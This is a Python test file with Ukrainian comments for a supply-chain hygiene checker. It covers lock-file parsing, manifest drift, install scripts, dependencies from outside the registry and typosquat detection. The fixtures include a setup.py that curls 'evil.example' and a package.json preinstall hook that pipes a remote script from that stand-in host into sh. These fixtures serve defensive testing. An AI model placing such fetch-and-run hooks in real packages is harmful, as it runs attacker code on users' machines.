"""Гігієна ланцюга постачання + читання lock-файлів.

Це те, чого не бачить ЖОДЕН аудитор уразливостей: розходження маніфесту й
lock-файлу, код, що виконується під час install, залежності повз офіційний
реєстр, і назви-двійники. Ці знахідки навмисно живуть окремим блоком — вони
ніколи не повинні потрапляти в лічильник CVE.
"""

from __future__ import annotations

import json

from src.deps.hygiene import (
    KIND_INSTALL_SCRIPT,
    KIND_LOCK_DRIFT,
    KIND_NON_REGISTRY,
    KIND_SUSPECT_NAME,
    check_cargo_build_script,
    check_install_scripts,
    check_lock_drift,
    check_non_registry,
    check_python_build_hooks,
    check_repo,
    check_suspect_names,
    classify_source,
    summarise,
)
from src.deps.locks import (
    LockEntry,
    mark_transitive,
    parse_cargo_lock,
    parse_go_sum,
    parse_package_lock,
    parse_pnpm_lock,
    parse_poetry_lock,
    parse_yarn_lock,
)

# ─── lock-файли ──────────────────────────────────────────────────────

PACKAGE_LOCK_V3 = {
    "name": "web",
    "lockfileVersion": 3,
    "packages": {
        "": {
            "name": "web",
            "dependencies": {"express": "^4.18.2", "lodash": "4.17.21"},
            "devDependencies": {"vitest": "^1.0.0"},
        },
        "node_modules/express": {
            "version": "4.18.2",
            "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
        },
        "node_modules/lodash": {
            "version": "4.17.20",
            "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
        },
        "node_modules/vitest": {
            "version": "1.2.0",
            "dev": True,
            "resolved": "https://registry.npmjs.org/vitest/-/vitest-1.2.0.tgz",
        },
        "node_modules/body-parser": {
            "version": "1.20.1",
            "resolved": "https://registry.npmjs.org/body-parser/-/body-parser-1.20.1.tgz",
        },
        "node_modules/esbuild": {
            "version": "0.19.0",
            "dev": True,
            "hasInstallScript": True,
            "resolved": "https://registry.npmjs.org/esbuild/-/esbuild-0.19.0.tgz",
        },
        "node_modules/express/node_modules/qs": {
            "version": "6.11.0",
            "resolved": "https://registry.npmjs.org/qs/-/qs-6.11.0.tgz",
        },
        "node_modules/internal-ui": {
            "version": "1.0.0",
            "resolved": "git+ssh://git@github.com/acme/internal-ui.git#a1b2c3d",
        },
    },
}


def test_package_lock_v3_depth_and_flags() -> None:
    entries = {e.package: e for e in parse_package_lock(PACKAGE_LOCK_V3)}

    assert entries["express"].transitive is False
    assert entries["express"].version == "4.18.2"
    # Не оголошений у package.json → притягнутий кимось іншим.
    assert entries["body-parser"].transitive is True
    # Вкладений node_modules — транзитивність видно з самого шляху.
    assert entries["qs"].transitive is True
    assert entries["vitest"].is_dev is True
    assert entries["express"].is_dev is False
    assert entries["esbuild"].has_install_script is True


def test_package_lock_v1_nesting() -> None:
    v1 = {
        "lockfileVersion": 1,
        "dependencies": {
            "express": {
                "version": "4.18.2",
                "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
                "dependencies": {
                    "qs": {"version": "6.11.0",
                           "resolved": "https://registry.npmjs.org/qs/-/qs-6.11.0.tgz"},
                },
            },
            "vitest": {"version": "1.2.0", "dev": True},
        },
    }
    entries = {e.package: e for e in parse_package_lock(v1)}
    assert entries["express"].transitive is False
    assert entries["qs"].transitive is True, "вкладеність = транзитивність у v1"
    assert entries["vitest"].is_dev is True


PNPM_LOCK = """lockfileVersion: '9.0'

importers:

  .:
    dependencies:
      react:
        specifier: ^18.2.0
        version: 18.2.0
    devDependencies:
      typescript:
        specifier: ^5.3.0
        version: 5.3.3

packages:

  react@18.2.0:
    resolution: {integrity: sha512-aaa}

  typescript@5.3.3:
    resolution: {integrity: sha512-bbb}

  loose-envify@1.4.0:
    resolution: {integrity: sha512-ccc}

  esbuild@0.19.0:
    resolution: {integrity: sha512-ddd}
    requiresBuild: true
"""


def test_pnpm_lock_importers_define_direct() -> None:
    entries = {e.package: e for e in parse_pnpm_lock(PNPM_LOCK)}
    assert entries["react"].version == "18.2.0"
    assert entries["react"].transitive is False
    assert entries["typescript"].is_dev is True
    assert entries["loose-envify"].transitive is True, "немає в importers → транзитивна"
    assert entries["esbuild"].has_install_script is True


def test_pnpm_lock_v5_key_shape() -> None:
    old = """lockfileVersion: 5.4
importers:
  .:
    dependencies:
      lodash: 4.17.21
packages:
  /lodash/4.17.21:
    resolution: {integrity: sha512-x}
  /@babel/core/7.23.0:
    resolution: {integrity: sha512-y}
"""
    entries = {e.package: e.version for e in parse_pnpm_lock(old)}
    assert entries["lodash"] == "4.17.21"
    assert entries["@babel/core"] == "7.23.0", "scoped-ім'я не має розпадатись"


def test_yarn_classic_lock() -> None:
    text = '''# yarn lockfile v1


lodash@^4.17.15:
  version "4.17.21"
  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#abc"

"@babel/core@^7.20.0":
  version "7.23.0"
  resolved "https://registry.yarnpkg.com/@babel/core/-/core-7.23.0.tgz#def"

internal-ui@git+ssh://git@github.com/acme/internal-ui.git:
  version "1.0.0"
  resolved "git+ssh://git@github.com/acme/internal-ui.git#a1b2c3"
'''
    entries = {e.package: e for e in parse_yarn_lock(text)}
    assert entries["lodash"].version == "4.17.21"
    assert entries["@babel/core"].version == "7.23.0"
    assert entries["internal-ui"].resolved.startswith("git+ssh://")


def test_poetry_and_cargo_and_go_locks() -> None:
    poetry = """[[package]]
name = "requests"
version = "2.31.0"
category = "main"

[[package]]
name = "pytest"
version = "7.4.0"
category = "dev"
"""
    entries = {e.package: e for e in parse_poetry_lock(poetry)}
    assert entries["requests"].version == "2.31.0"
    assert entries["pytest"].is_dev is True

    cargo = """[[package]]
name = "serde"
version = "1.0.190"
source = "registry+https://github.com/rust-lang/crates.io-index"

[[package]]
name = "local-helper"
version = "0.1.0"
"""
    crates = {e.package: e for e in parse_cargo_lock(cargo)}
    assert crates["serde"].version == "1.0.190"
    assert crates["local-helper"].resolved is None

    go_sum = """golang.org/x/net v0.17.0 h1:aaa=
golang.org/x/net v0.17.0/go.mod h1:bbb=
github.com/gin-gonic/gin v1.9.1 h1:ccc=
"""
    modules = {e.package: e.version for e in parse_go_sum(go_sum)}
    assert modules["golang.org/x/net"] == "0.17.0"
    assert modules["github.com/gin-gonic/gin"] == "1.9.1"
    assert len(parse_go_sum(go_sum)) == 2, "/go.mod рядок — це той самий модуль"


def test_mark_transitive_uses_the_manifest() -> None:
    entries = [
        LockEntry("PyPI", "requests", "2.31.0", False, False, None, "poetry.lock"),
        LockEntry("PyPI", "certifi", "2023.7.22", False, False, None, "poetry.lock"),
    ]
    marked = {e.package: e.transitive
              for e in mark_transitive(entries, {"PyPI": {"requests"}})}
    assert marked["requests"] is False
    assert marked["certifi"] is True, "у lock є, у маніфесті немає → транзитивна"


# ─── 1. розходження маніфесту й lock-файлу ───────────────────────────


def test_lock_drift_missing_pin_mismatch_and_extra() -> None:
    declared = {"express": "^4.18.2", "lodash": "4.17.21", "zod": "^3.22.0"}
    lock = parse_package_lock(PACKAGE_LOCK_V3)
    found = check_lock_drift(declared, lock, ecosystem="npm",
                             manifest="package.json", lockfile="package-lock.json")
    detail = {(f.package, f.detail) for f in found}

    assert all(f.kind == KIND_LOCK_DRIFT for f in found)
    # 1) оголошено, але не залочено
    assert any(p == "zod" and "missing from package-lock.json" in d for p, d in detail)
    # 2) точний пін не збігається з тим, що резолвиться
    assert any(p == "lodash" and "pins 4.17.21" in d and "resolves 4.17.20" in d
               for p, d in detail)
    # 3) залочене як пряме, але зникло з маніфесту
    assert any(p == "vitest" and "absent from package.json" in d for p, d in detail)
    # express збігається — жодної знахідки
    assert not any(p == "express" for p, _ in detail)


def test_lock_drift_does_not_mistake_ranges_for_pins() -> None:
    """`"^4.18.2"` в npm і `"1.0"` в cargo — це діапазони. Вважати їх точними
    пінами означає рапортувати розходження на кожній нормальній залежності."""
    lock = [LockEntry("crates.io", "serde", "1.0.190", False, False, None, "Cargo.lock")]
    assert check_lock_drift({"serde": "1.0"}, lock, ecosystem="crates.io",
                            manifest="Cargo.toml", lockfile="Cargo.lock",
                            report_extra=False) == []
    # А ось `=1.0.0` — справді точний пін.
    mismatch = check_lock_drift({"serde": "=1.0.0"}, lock, ecosystem="crates.io",
                                manifest="Cargo.toml", lockfile="Cargo.lock",
                                report_extra=False)
    assert len(mismatch) == 1 and "resolves 1.0.190" in mismatch[0].detail


def test_lock_drift_python_needs_double_equals() -> None:
    lock = [LockEntry("PyPI", "requests", "2.31.0", False, False, None, "poetry.lock")]
    assert check_lock_drift({"requests": ">=2.28"}, lock, ecosystem="PyPI",
                            manifest="pyproject.toml", lockfile="poetry.lock",
                            report_extra=False) == []
    pinned = check_lock_drift({"requests": "==2.28.0"}, lock, ecosystem="PyPI",
                              manifest="pyproject.toml", lockfile="poetry.lock",
                              report_extra=False)
    assert len(pinned) == 1


# ─── 2. код, що виконується під час install ──────────────────────────


def test_install_scripts_own_manifest_and_direct_deps() -> None:
    package_json = {
        "scripts": {"postinstall": "node scripts/patch.js", "test": "vitest"},
        "dependencies": {"esbuild": "^0.19.0"},
        "devDependencies": {},
    }
    found = check_install_scripts(package_json, parse_package_lock(PACKAGE_LOCK_V3))
    assert all(f.kind == KIND_INSTALL_SCRIPT for f in found)
    assert any("runs `postinstall`" in f.detail for f in found)
    assert any(f.package == "esbuild" and "install script" in f.detail for f in found)
    # `test` — не lifecycle-хук, він не запускається сам по собі.
    assert not any("`test`" in f.detail for f in found)


def test_install_scripts_ignore_transitive_packages() -> None:
    """Завдання явно про ПРЯМІ залежності: install-скрипт у глибині дерева —
    це шум, який ніхто не піде правити."""
    package_json = {"dependencies": {"express": "^4.18.2"}}
    found = check_install_scripts(package_json, parse_package_lock(PACKAGE_LOCK_V3))
    assert not any(f.package == "esbuild" for f in found)


def test_setup_py_and_build_rs() -> None:
    trivial = "from setuptools import setup\nsetup(name='x', version='1.0')\n"
    assert check_python_build_hooks(trivial) == []

    risky = ("from setuptools import setup\nimport subprocess\n"
             "subprocess.run(['curl', 'http://evil.example/x.sh'])\nsetup(name='x')\n")
    found = check_python_build_hooks(risky)
    assert len(found) == 1 and "subprocess" in found[0].detail

    assert check_cargo_build_script({"package": {"name": "x"}}, False) == []
    assert len(check_cargo_build_script({"package": {"name": "x"}}, True)) == 1


# ─── 3. залежності повз офіційний реєстр ─────────────────────────────


def test_classify_source_covers_every_escape_hatch() -> None:
    assert classify_source("^4.18.2") is None
    assert classify_source("git+https://github.com/acme/x.git")[0] == "medium"
    assert classify_source("git@github.com:acme/x.git")[0] == "medium"
    assert classify_source("file:../shared")[0] == "low"
    assert classify_source("workspace:*")[0] == "low"
    assert classify_source("acme/internal-ui")[0] == "medium", "GitHub-скорочення"

    private = classify_source("https://npm.internal.acme.io/lodash/-/lodash-4.tgz")
    assert private is not None and "npm.internal.acme.io" in private[1]

    assert classify_source(
        "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz") is None
    plain_http = classify_source("http://registry.npmjs.org/lodash/-/lodash-4.tgz")
    assert plain_http is not None and plain_http[0] == "high"


def test_non_registry_reports_manifest_and_lock() -> None:
    specs = {"internal-ui": "git+ssh://git@github.com/acme/internal-ui.git",
             "express": "^4.18.2"}
    found = check_non_registry(specs, parse_package_lock(PACKAGE_LOCK_V3))
    assert all(f.kind == KIND_NON_REGISTRY for f in found)
    assert any(f.package == "internal-ui" for f in found)
    assert not any(f.package == "express" for f in found)


# ─── 4. підозра на тайпсквотінг (офлайн) ─────────────────────────────


def test_suspect_names_flags_one_keystroke_lookalikes() -> None:
    found = check_suspect_names(
        ["lodash", "loadash", "reakt", "expres", "typescript", "our-own-lib"],
        ecosystem="npm")
    flagged = {f.package for f in found}
    assert flagged == {"loadash", "reakt", "expres"}
    assert all(f.kind == KIND_SUSPECT_NAME for f in found)
    assert all("SUSPECT" in f.detail for f in found)
    assert any("'lodash'" in f.detail for f in found), "двійника треба назвати"


def test_suspect_names_are_conservative() -> None:
    """Перевірка навмисно тупа й офлайнова: жодних припущень про популярність,
    жодних звинувачень — тільки «схоже на X, перевір»."""
    # Точний збіг — не підозра.
    assert check_suspect_names(["react", "lodash"], ecosystem="npm") == []
    # Занадто коротке ім'я — відстань 1 там нічого не означає.
    assert check_suspect_names(["dep"], ecosystem="npm") == []
    # Дві правки — вже не «одна клавіша», не рапортуємо.
    assert check_suspect_names(["lodahs2x"], ecosystem="npm") == []
    # Scoped-пакет звіряється за іменем усередині скоупу.
    assert {f.package for f in check_suspect_names(["@acme/reakt"], ecosystem="npm")} \
        == {"@acme/reakt"}
    # PyPI має власний список.
    assert {f.package for f in check_suspect_names(["reqeusts"], ecosystem="PyPI")} \
        == {"reqeusts"}


def test_suspect_names_transposition() -> None:
    assert {f.package for f in check_suspect_names(["axois"], ecosystem="npm")} \
        == {"axois"}, "переставлені сусідні літери — класика тайпсквотінгу"


# ─── інтеграція по теці ──────────────────────────────────────────────


def test_check_repo_walks_a_real_tree(tmp_path) -> None:
    (tmp_path / "package.json").write_text(json.dumps({
        "name": "app",
        "scripts": {"preinstall": "curl http://evil.example/i.sh | sh"},
        "dependencies": {"express": "^4.18.2", "lodash": "4.17.21",
                         "internal-ui": "git+ssh://git@github.com/acme/internal-ui.git",
                         "loadash": "^1.0.0"},
        "devDependencies": {},
    }))
    (tmp_path / "package-lock.json").write_text(json.dumps(PACKAGE_LOCK_V3))

    findings = check_repo(tmp_path)
    kinds = {f.kind for f in findings}
    assert KIND_LOCK_DRIFT in kinds
    assert KIND_INSTALL_SCRIPT in kinds
    assert KIND_NON_REGISTRY in kinds
    assert KIND_SUSPECT_NAME in kinds

    summary = summarise(findings)
    assert summary["total"] == len(findings)
    assert summary["by_kind"][KIND_SUSPECT_NAME] >= 1
    assert all(set(item) >= {"kind", "severity", "package", "detail", "location"}
               for item in summary["items"])


def test_check_repo_is_quiet_on_a_clean_project(tmp_path) -> None:
    """Головна вимога до евристик: не кричати на здоровому проєкті."""
    (tmp_path / "package.json").write_text(json.dumps({
        "name": "app",
        "dependencies": {"express": "^4.18.2"},
        "devDependencies": {"vitest": "^1.0.0"},
    }))
    (tmp_path / "package-lock.json").write_text(json.dumps({
        "lockfileVersion": 3,
        "packages": {
            "": {"dependencies": {"express": "^4.18.2"},
                 "devDependencies": {"vitest": "^1.0.0"}},
            "node_modules/express": {
                "version": "4.18.2",
                "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz"},
            "node_modules/vitest": {
                "version": "1.2.0", "dev": True,
                "resolved": "https://registry.npmjs.org/vitest/-/vitest-1.2.0.tgz"},
        },
    }))
    assert check_repo(tmp_path) == []
